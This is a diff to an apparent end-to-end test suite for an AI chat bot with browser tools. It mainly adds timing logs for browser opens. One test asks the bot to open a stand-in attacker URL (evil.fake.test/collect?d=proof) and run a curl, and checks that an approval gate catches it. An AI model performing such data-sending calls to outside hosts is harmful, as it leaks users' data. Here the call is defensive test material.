@@ -492,7 +492,54 @@ const journey = {
   pendingApprovals: 0,
   collectHits: -1,
   signInMs: 0,
+  /** Every `ocw_browser_open` ask through the cell (step, ms); the first starts the bot's browser cold (CI p64/p66). */
+  opens: [] as Array<{ step: number; ms: number }>,
+  /** The first open's legs from the API and sandboxd logs (ms; -1 when a log does not say). */
+  firstOpen: { api: -1, ensure: -1, brwStarted: -1, brwReady: -1, contextOpen: -1, navigate: -1 },
 };
+
+/** The JSON lines of one log of the isolated stack (`api.log`, `sandboxd.log`); none when it is not there. */
+function stackLog(file: string): Array<Record<string, unknown>> {
+  const dir = process.env.OCW_E2E_RUN_DIR ?? "";
+  const p = dir ? join(dir, file) : "";
+  if (!p || !existsSync(p)) return [];
+  return readFileSync(p, "utf8")
+    .split("\n")
+    .flatMap((l) => {
+      try {
+        const v = JSON.parse(l) as unknown;
+        return v && typeof v === "object" ? [v as Record<string, unknown>] : [];
+      } catch {
+        return [];
+      }
+    });
+}
+
+/**
+ * Where the first open's time went (CI p64/p66), from logs that carry ids, ops, statuses and durations only: the API's
+ * `/browser/open`, then sandboxd's `browserEnsure` (the bot's brw container started, Chromium ready), `contextOpen` and
+ * `contextNavigate`.
+ */
+function firstOpenLegs(agentId: string, since: number): typeof journey.firstOpen {
+  const legs = { api: -1, ensure: -1, brwStarted: -1, brwReady: -1, contextOpen: -1, navigate: -1 };
+  const ms = (v: unknown) => (typeof v === "number" ? Math.round(v) : -1);
+  const api = stackLog("api.log").filter((l) => typeof l.time === "number" && l.time >= since);
+  const asked = api.find(
+    (l) => (l.req as { url?: string } | undefined)?.url === "/agent-channel/v1/browser/open",
+  );
+  const done = asked && api.find((l) => l.reqId === asked.reqId && l.msg === "request completed");
+  if (done) legs.api = ms(done.responseTime);
+  const sbx = stackLog("sandboxd.log").filter(
+    (l) => l.agentId === agentId && typeof l.time === "string" && Date.parse(l.time) >= since,
+  );
+  const first = (pick: (l: Record<string, unknown>) => boolean) => ms(sbx.find(pick)?.ms);
+  legs.ensure = first((l) => l.msg === "request" && l.op === "browserEnsure");
+  legs.brwStarted = first((l) => l.msg === "brw started");
+  legs.brwReady = first((l) => l.msg === "brw ready" && "reattach" in l);
+  legs.contextOpen = first((l) => l.msg === "request" && l.op === "contextOpen");
+  legs.navigate = first((l) => l.msg === "request" && l.op === "contextNavigate");
+  return legs;
+}
 
 interface Live {
   ws: WebSocket;
@@ -621,12 +668,18 @@ test("6. Sam signs in for Guide by typing in the real page through the live view
   expect(dm.ok(), "Sam's DM with Guide").toBe(true);
   journey.dm = ((await dm.json()) as { dmId: string }).dmId;
 
+  const openAsked = Date.now();
   const opened = await ask(
     sam,
     journey.dm,
     `look ${call("ocw_browser_open", { url: `http://${PANEL}/app` })} ${call("ocw_browser_snapshot", {})}`,
     "ocw_browser_open",
   );
+  // Recorded before the assertions, so a failed first open still says where its time went.
+  journey.opens.push({ step: 6, ms: opened.ms });
+  journey.firstOpen = firstOpenLegs(journey.guideId, openAsked);
+  console.log(`[proof] first open legs (ms): ${JSON.stringify(journey.firstOpen)}`);
+  record();
   expect(opened.reply).toContain(`Tool ocw_browser_open said: Opened ${PANEL}`);
   expect(opened.reply).toContain("Sign in");
   const asked = await ask(
@@ -736,7 +789,11 @@ test("8. D-13: an open of evil.fake.test, a click on the Export link and a curl 
   test.setTimeout(2 * REAL);
   const sam = await apiAs(SAM);
   const collectBefore = fakeSiteStats().collect ?? 0;
-  const { reply, asked } = await ask(
+  const {
+    reply,
+    asked,
+    ms: d13Ms,
+  } = await ask(
     sam,
     journey.dm,
     `send it ${call("ocw_browser_open", { url: `http://${EVIL}/collect?d=proof` })} ${call(
@@ -750,6 +807,8 @@ test("8. D-13: an open of evil.fake.test, a click on the Export link and a curl 
     )}`,
     "ocw_browser_open",
   );
+  journey.opens.push({ step: 8, ms: d13Ms });
+  record();
   const lines = reply.split("\n");
   console.log(`[proof] D-13 reply:\n${reply}`);
   expect(lines[0]).toContain(`Tool ocw_browser_open said: ${APPROVAL_SENTENCE}`);
@@ -793,6 +852,8 @@ test("9. reuse, revoke, never another member's; frames reach others again once t
     `again ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
     "ocw_browser_open",
   );
+  journey.opens.push({ step: 9, ms: again.ms });
+  record();
   expect(again.reply).toContain("Signed in");
   // Sam revokes: the page that had it loaded ends.
   const revoked = await sam.delete(`/api/v1/browser-sessions/${journey.sessionId}`);
@@ -810,6 +871,8 @@ test("9. reuse, revoke, never another member's; frames reach others again once t
     `once more ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
     "ocw_browser_open",
   );
+  journey.opens.push({ step: 9, ms: after.ms });
+  record();
   expect(after.reply).toContain(`Opened ${PANEL}`);
   expect(after.reply).not.toContain("Signed in");
   // Ana's own DM with Guide never loads Sam's session.
@@ -821,6 +884,8 @@ test("9. reuse, revoke, never another member's; frames reach others again once t
     `mine ${call("ocw_browser_open", { url: `http://${PANEL}/app` })}`,
     "ocw_browser_open",
   );
+  journey.opens.push({ step: 9, ms: theirs.ms });
+  record();
   expect(theirs.reply).not.toContain("Signed in");
   // Frames again: Ana watches the page Sam's DM has open now (no session loaded), and receives frames.
   const { rows } = await asSuperuser<{ id: string }>(
